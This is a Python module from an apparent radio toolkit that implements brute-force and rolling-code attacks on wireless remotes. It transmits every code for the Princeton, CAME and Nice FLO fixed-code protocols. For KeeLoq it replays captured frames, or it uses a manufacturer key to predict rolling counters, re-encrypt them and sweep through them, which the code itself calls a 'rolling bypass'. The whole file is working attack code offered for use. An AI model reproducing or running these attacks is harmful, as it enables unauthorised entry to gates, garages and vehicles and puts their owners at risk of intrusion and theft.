"""Dynamic brute-force: code generators + TX runner + KeeLoq attacks."""

from __future__ import annotations

import time

from omni.rf import keeloq_crypto as kq
from omni.rf.keystore import manufacturer_key, resolve_man
from omni.rf.protocols import build_keeloq_upload
from omni.rf.protocols.keeloq import next_counter
from omni.rf.protocols.came import CameEncoder
from omni.rf.protocols.nice_flo import NiceFloEncoder
from omni.rf.protocols.princeton import PrincetonEncoder

_PROTO_ENC = {
    "Princeton": (PrincetonEncoder, 24, 390),
    "CAME": (CameEncoder, 12, 320),
    "Nice FLO": (NiceFloEncoder, 12, 500),
}


# ---------------------------------------------------------------------------
# code generators
# ---------------------------------------------------------------------------

def frames_came(start: int = 0, count: int = 4096):
    for code in range(start, start + count):
        yield code


def frames_nice(start: int = 0, count: int = 4096):
    for code in range(start, start + count):
        yield code


def frames_princeton(start: int = 0, count: int = 4096):
    for code in range(start, start + count):
        yield code


def frames_keeloq_counters(sub, keystore=None, count: int = 12,
                           counter_mode: int = 2, counter_mult: int = 1):
    """Yield `count` KeeLoq uploads with predicted rolling counters.

    Without a matching manufacturer key the captured hop is replayed.
    """
    fix, hop = kq.split_frame(sub.key)
    btn, serial = kq.parse_fix(fix)
    te = sub.te or 400
    entry = None
    if keystore and sub.manufacture:
        entry = keystore.get(sub.manufacture)

    if entry is None:
        upload = build_keeloq_upload(fix, hop, te)
        for _ in range(max(0, count)):
            yield upload
        return

    man, dec = resolve_man(entry, fix, hop, sub.seed)
    if man is None:
        upload = build_keeloq_upload(fix, hop, te)
        for _ in range(max(0, count)):
            yield upload
        return
    cnt = dec & 0xFFFF
    for _ in range(max(0, count)):
        cnt = next_counter(cnt, counter_mode, counter_mult)
        word = (((btn & 0xF) << 28) | ((serial & 0x3FF) << 16)
                | (cnt & 0xFFFF))
        yield build_keeloq_upload(fix, kq.keeloq_encrypt(word, man), te)


class BruteForcer:
    """Runs brute-force / counter attacks through a TxEngine."""

    def __init__(self, tx):
        self.tx = tx

    def run_codes(self, preset, freq, proto, codes, repeat_per_code: int = 1,
                 inter_code_gap_s: float = 0.004, progress=None) -> int:
        enc_cls, bits, te = _PROTO_ENC[proto]
        codes = list(codes)
        total = len(codes)
        sent = 0
        for i, code in enumerate(codes, 1):
            enc = enc_cls(data=code, data_count_bit=bits, te=te)
            self.tx.send(preset, freq, enc.build_upload(),
                         repeat=repeat_per_code)
            if inter_code_gap_s:
                time.sleep(inter_code_gap_s)
            sent += 1
            if progress is not None and progress(i, total):
                break
        return sent

    def run_keeloq(self, preset, freq, sub, keystore, count: int = 12,
                  counter_mode: int = 2, counter_mult: int = 1,
                  progress=None) -> int:
        uploads = list(frames_keeloq_counters(sub, keystore, count,
                                              counter_mode, counter_mult))
        total = len(uploads)
        sent = 0
        for i, upload in enumerate(uploads, 1):
            self.tx.send(preset, freq, upload, repeat=1)
            sent += 1
            if progress is not None and progress(i, total):
                break
        return sent

    def run_keeloq_sweep(self, preset, freq, sub, keystore,
                        counter_from: int = 0, counter_to=None, step: int = 1,
                        progress=None) -> int:
        """Spray re-encrypted hops for a window of counters (rolling bypass)."""
        if keystore is None or not sub.manufacture:
            raise ValueError("manufacturer key unknown — cannot re-encrypt hops")
        entry = keystore.get(sub.manufacture)
        if entry is None:
            raise ValueError(f"no manufacturer key for {sub.manufacture!r}")
        fix, hop = kq.split_frame(sub.key)
        btn, serial = kq.parse_fix(fix)
        man, dec = resolve_man(entry, fix, hop, sub.seed)
        if man is None:
            man = manufacturer_key(entry, fix, sub.seed)
        te = sub.te or 400
        counter_from &= 0xFFFF
        counter_to = (counter_from if counter_to is None
                      else counter_to & 0xFFFF)
        step = max(1, int(step))
        total = (((counter_to - counter_from) & 0xFFFF) // step) + 1

        sent = 0
        cnt = counter_from
        while True:
            word = (((btn & 0xF) << 28) | ((serial & 0x3FF) << 16)
                    | (cnt & 0xFFFF))
            hop2 = kq.keeloq_encrypt(word, man)
            self.tx.send(preset, freq, build_keeloq_upload(fix, hop2, te),
                         repeat=1)
            sent += 1
            if progress is not None and progress(sent, total):
                break
            if cnt == counter_to:
                break
            cnt = (cnt + step) & 0xFFFF
        return sent
